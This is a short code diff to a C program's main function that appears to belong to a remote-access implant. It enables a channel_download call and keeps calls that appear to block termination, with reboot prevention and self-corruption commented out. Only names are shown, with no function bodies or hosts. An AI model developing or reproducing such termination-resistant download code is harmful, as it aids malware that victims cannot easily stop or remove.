@@ -40,10 +40,8 @@ int main(int argc, char *argv[])
 
         prevent_termination();
         //prevent_reboot();
-        char buf[1025];
-        channel_read(channel, buf, 1024);
 
-//        channel_download(channel, "test");
+        channel_download(channel, "test");
         
         //self_corrupt(argv[0]);
         channel_close(channel);
